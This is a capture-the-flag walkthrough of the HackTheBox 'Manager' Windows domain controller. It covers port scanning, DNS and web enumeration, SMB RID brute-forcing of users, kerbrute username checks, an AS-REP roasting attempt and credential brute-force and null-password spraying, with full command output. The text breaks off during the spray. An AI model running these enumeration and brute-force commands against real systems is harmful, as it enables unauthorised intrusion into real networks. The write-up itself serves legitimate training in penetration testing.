---
render_with_liquid: false
title: HackTheBox Writeup  Manager
date: 2023-10-23 00:07:37 +1400
tags: [hackthebox, nmap, windows, ad, autorecon, mssql, feroxbuster, crackmapexec, enum4linux, user-enumeration, brute-force-attack, hashcat-rules, smartbrute, weak-credentials, ldapdomaindump, password-reuse, mssqlclient, discover-backup, discover-secrets, evil-winrm, certipy, adcs, adcs-esc7, pass-the-cert, pass-the-ticket, dcsync, dns, gobuster, cewl, brutespray, kerbrute, hashcat, bloodhound, ldeep, ad-miner, coerce-authentication, msdat, adcskiller, oscp-like-2023]
---



# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ pt init '10.129.52.126 manager.htb DC01.manager.htb'
+---------+--------+---------------+------------------+
| PROFILE | STATUS |      IP       |      DOMAIN      |
+---------+--------+---------------+------------------+
| manager | on     | 10.129.52.126 | manager.htb      |
| manager | on     | 10.129.52.126 | DC01.manager.htb |
+---------+--------+---------------+------------------+
```


## Nmap

```bash

# Nmap 7.94 scan initiated Mon Oct 23 00:07:36 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49677,49678,49679,49716,54256,63916 10.129.52.126
Nmap scan report for 10.129.52.126
Host is up, received user-set (0.12s latency).
Scanned at 2023-10-23 00:07:37 CST for 99s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-10-22 23:08:07Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
...
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-10-22T23:09:40+00:00; +7h00m24s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T23:09:38+00:00; +7h00m24s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
...
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-10-22T23:09:40+00:00; +7h00m24s from scanner time.
| ms-sql-info:
|   10.129.52.126:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.129.52.126:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-22T22:36:41
| Not valid after:  2053-10-22T22:36:41
| MD5:   5ed2:797c:6a15:d92f:f0f1:9acc:2251:fa30
| SHA-1: 8dde:ee0a:67ff:11c4:a405:bbc2:7532:6e9e:4352:3ea3
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQcVc0+Zn9P6tP6qQaltt8TzANBgkqhkiG9w0BAQsFADA7
...
| kRKsCpWqJ89nn+WpNUYEpwOD+mQLtqsVK5zd1FkPawQBIvBhgH/loXlEh3syY+Yg
| 7ope5Q==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
...
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
|_ssl-date: 2023-10-22T23:09:39+00:00; +7h00m23s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-22T23:09:38+00:00; +7h00m24s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
| SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
| -----BEGIN CERTIFICATE-----
| MIIGMDCCBRigAwIBAgITXwAAAAnyIQ82Fp4XhwAAAAAACTANBgkqhkiG9w0BAQsF
...
| 5U81h/XKD4e21fDdv4wge+LFubtqzOqOKWXlrOXcfdc7dBdRt+tD3bIcTO63AQFC
| A0xH1Q==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54256/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63916/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-10-22T23:08:59
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 46639/tcp): CLEAN (Timeout)
|   Check 2 (port 25253/tcp): CLEAN (Timeout)
|   Check 3 (port 14344/udp): CLEAN (Timeout)
|   Check 4 (port 62402/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h00m23s, deviation: 0s, median: 7h00m23s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Oct 23 00:09:16 2023 -- 1 IP address (1 host up) scanned in 99.69 seconds
```

## Autorecon

```bash
sudo $(which autorecon) -vv manager.htb --global.domain manager.htb
```

## 53 - DNS

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ dig axfr @10.129.52.126 manager.htb

; <<>> DiG 9.19.17-1-Debian <<>> axfr @10.129.52.126 manager.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ dnsrecon -n manager.htb -d manager.htb 2>&1
[*] std: Performing General Enumeration against: manager.htb...
[-] DNSSEC is not configured for manager.htb
[*]      SOA dc01.manager.htb 10.129.52.126
[*]      NS dc01.manager.htb 10.129.52.126
[*]      A manager.htb 10.129.52.126
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.manager.htb dc01.manager.htb 10.129.52.126 3268
[+]      SRV _kerberos._udp.manager.htb dc01.manager.htb 10.129.52.126 88
[+]      SRV _ldap._tcp.manager.htb dc01.manager.htb 10.129.52.126 389
[+]      SRV _kerberos._tcp.manager.htb dc01.manager.htb 10.129.52.126 88
[+]      SRV _ldap._tcp.ForestDNSZones.manager.htb dc01.manager.htb 10.129.52.126 389
[+]      SRV _ldap._tcp.pdc._msdcs.manager.htb dc01.manager.htb 10.129.52.126 389
[+]      SRV _ldap._tcp.dc._msdcs.manager.htb dc01.manager.htb 10.129.52.126 389
[+]      SRV _ldap._tcp.gc._msdcs.manager.htb dc01.manager.htb 10.129.52.126 3268
[+]      SRV _kpasswd._udp.manager.htb dc01.manager.htb 10.129.52.126 464
[+]      SRV _kerberos._tcp.dc._msdcs.manager.htb dc01.manager.htb 10.129.52.126 88
[+]      SRV _kpasswd._tcp.manager.htb dc01.manager.htb 10.129.52.126 464
[+] 11 Records Found
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$  dnsrecon -n manager.htb -d manager.htb -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt 2>&1
[*] Using the dictionary file: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt (provided by user)
[*] brt: Performing host and subdomain brute force against manager.htb...
[+]      A gc._msdcs.manager.htb 10.129.52.126
[+]      A domaindnszones.manager.htb 10.129.52.126
[+]      A forestdnszones.manager.htb 10.129.52.126
[+]      A dc01.manager.htb 10.129.52.126
[+] 4 Records Found
```

## 80 - HTTP : Content Writing Services


### Info

```ruby
http://manager.htb [200] [Manager] [Microsoft-IIS/10.0] [Bootstrap,IIS:10.0,OWL Carousel,Windows Server,jQuery] [c0e5189b45996ff0d43e9d8d02d6ffda21da5b34]
```

![](/assets/obsidian/6c4d57d306172607b91f4ac04f1516b9.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_80.txt -u http://manager.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x aspx,txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cat ferox_80.txt
301      GET        2l       10w      149c http://manager.htb/images => http://manager.htb/images/
200      GET       10l       43w     2023c http://manager.htb/images/call.png
200      GET      165l      367w     5317c http://manager.htb/contact.html
200      GET        6l       22w     1052c http://manager.htb/images/location.png
200      GET      224l      650w     7900c http://manager.htb/service.html
200      GET        4l       20w     1337c http://manager.htb/images/s-2.png
200      GET        7l       29w     1606c http://manager.htb/images/envelope-o.png
200      GET       10l       42w     2704c http://manager.htb/images/call-o.png
200      GET      614l     1154w    11838c http://manager.htb/css/style.css
200      GET        9l       41w     2465c http://manager.htb/images/s-4.png
200      GET        6l       17w     1553c http://manager.htb/images/s-1.png
200      GET        6l       20w     1360c http://manager.htb/images/location-o.png
200      GET       14l       48w     3837c http://manager.htb/images/logo.png
200      GET        9l       31w     2492c http://manager.htb/images/s-3.png
200      GET      157l      414w     5386c http://manager.htb/about.html
200      GET        9l       25w     1255c http://manager.htb/images/envelope.png
200      GET       85l      128w     1389c http://manager.htb/css/responsive.css
200      GET      149l      630w    53431c http://manager.htb/images/client.jpg
200      GET      507l     1356w    18203c http://manager.htb/index.html
200      GET       82l      542w    56157c http://manager.htb/images/contact-img.jpg
200      GET        2l     1276w    88145c http://manager.htb/js/jquery-3.4.1.min.js
200      GET     4437l    10999w   131863c http://manager.htb/js/bootstrap.js
200      GET    10038l    19587w   192348c http://manager.htb/css/bootstrap.css
200      GET     1313l     7384w   563817c http://manager.htb/images/about-img.png
200      GET      507l     1356w    18203c http://manager.htb/
403      GET       29l       92w     1233c http://manager.htb/css/
403      GET       29l       92w     1233c http://manager.htb/js/
301      GET        2l       10w      146c http://manager.htb/css => http://manager.htb/css/
301      GET        2l       10w      145c http://manager.htb/js => http://manager.htb/js/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://manager.htb/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://manager.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: *.manager.htb Status: 400 [Size: 334]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb $(pt get rhost) -u '' -p ''
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\:

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\a:
```


### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb $(pt get rhost) -u 'a' -p '' --shares
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\a:
SMB         10.129.52.126   445    DC01             [*] Enumerated shares
SMB         10.129.52.126   445    DC01             Share           Permissions     Remark
SMB         10.129.52.126   445    DC01             -----           -----------     ------
SMB         10.129.52.126   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.52.126   445    DC01             C$                              Default share
SMB         10.129.52.126   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.52.126   445    DC01             NETLOGON                        Logon server share
SMB         10.129.52.126   445    DC01             SYSVOL                          Logon server share
```

### Users & Groups

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u 'a' -p '' --users --rid-brute
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\a:
SMB         10.129.52.126   445    DC01             [*] Trying to dump local users with SAMRPC protocol
SMB         10.129.52.126   445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.52.126   445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.52.126   445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.52.126   445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.52.126   445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.52.126   445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.52.126   445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.52.126   445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.52.126   445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.52.126   445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.52.126   445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.52.126   445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.52.126   445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.52.126   445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.52.126   445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.52.126   445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.52.126   445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.52.126   445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.52.126   445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.52.126   445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.52.126   445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.52.126   445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.52.126   445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.52.126   445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.52.126   445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.52.126   445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.52.126   445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.52.126   445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.52.126   445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.52.126   445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.52.126   445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.52.126   445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

### Password Policy

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u 'a' -p '' --pass-pol
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [+] manager.htb\a:
```


# User Flag
---

## Enumeration


### Enum4linux

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ python /opt/sectools/ad/enum4linux-ng/enum4linux-ng.py -oA enum4linux -A manager.htb -u a -p ''
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... manager.htb
[*] Username ......... 'a'
[*] Random Username .. 'xmfuhviy'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ====================================
|    Listener Scan on manager.htb    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ===================================================
|    Domain Information via LDAP for manager.htb    |
 ===================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: manager.htb

 ==========================================================
|    NetBIOS Names and Workgroup/Domain for manager.htb    |
 ==========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ========================================
|    SMB Dialect Check on manager.htb    |
 ========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ==========================================================
|    Domain Information via SMB session for manager.htb    |
 ==========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: MANAGER
DNS domain: manager.htb
FQDN: dc01.manager.htb
Derived membership: domain member
Derived domain: MANAGER

 ========================================
|    RPC Session Check on manager.htb    |
 ========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'a', password ''
[*] Check for random user
[+] Server allows session using username 'xmfuhviy', password ''
[H] Rerunning enumeration with user 'xmfuhviy' might give more results

 ==================================================
|    Domain Information via RPC for manager.htb    |
 ==================================================
[+] Domain: MANAGER
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 ==============================================
|    OS Information via RPC for manager.htb    |
 ==============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102f'
Server type string: Wk Sv Sql PDC Tim NT

 ====================================
|    Users via RPC on manager.htb    |
 ====================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =====================================
|    Groups via RPC on manager.htb    |
 =====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =====================================
|    Shares via RPC on manager.htb    |
 =====================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED

 ========================================
|    Policies via RPC for manager.htb    |
 ========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ========================================
|    Printers via RPC for manager.htb    |
 ========================================
[+] No printers available

Completed after 31.77 seconds
```


### Username brute force


#### Cewl

No users found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cewl -d 5 -m 3 --with-numbers -w cewl.txt http://manager.htb/index.html

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ kerbrute userenum -d manager.htb --dc DC01.manager.htb cewl.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/23/23 - Ronnie Flathers @ropnop

2023/10/23 00:44:23 >  Using KDC(s):
2023/10/23 00:44:23 >   DC01.manager.htb:88

2023/10/23 00:44:25 >  Done! Tested 148 usernames (0 valid) in 1.824 second
```

#### Seclists

No new users found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ kerbrute userenum -d manager.htb --dc DC01.manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Asreproasting

Parse users from CME rid brute force

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cat users.cme|grep SidTypeUser|awk '{print $11}'|cut -d '\' -f2 > cme_users.txt
```

No `asreproastable` users found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ kerbrute userenum -d manager.htb --dc DC01.manager.htb cme_users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 10/23/23 - Ronnie Flathers @ropnop

2023/10/23 03:04:04 >  Using KDC(s):
2023/10/23 03:04:04 >   DC01.manager.htb:88

2023/10/23 03:04:04 >  [+] VALID USERNAME:       JinWoo@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Zhong@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       DC01$@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       ChinHae@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Cheng@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Raven@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Ryan@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Guest@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Administrator@manager.htb
2023/10/23 03:04:04 >  [+] VALID USERNAME:       Operator@manager.htb
2023/10/23 03:04:04 >  Done! Tested 11 usernames (10 valid) in 0.138 seconds

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ GetNPUsers.py -dc-ip manager.htb MANAGER.htb/ -usersfile cme_users.txt -format hashcat
Impacket v0.12.0.dev1+20231012.22017.2de2918 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JinWoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ChinHae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Operator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Credential brute force


#### Brutespray

Make password wordlist based on cewl result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ hashcat --force --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > cewl_b64.txt
```

Commands ran

```bash
brutespray -f nmap/all_tcp_ports.gnmap -t 50 -T 5
brutespray -f nmap/all_tcp_ports.gnmap -t 50 -T 5 -U cme_users.txt
brutespray -f nmap/all_tcp_ports.gnmap -t 50 -T 5 -U cme_users.txt -P cewl_b64.txt
```

#### Null password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u cme_users.txt -p '' --continue-on-success
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [-] manager.htb\Administrator: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [+] manager.htb\Guest:
SMB         10.129.52.126   445    DC01             [-] manager.htb\krbtgt: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\DC01$: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Zhong: STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Cheng: STATUS_LOGON_FAILURE
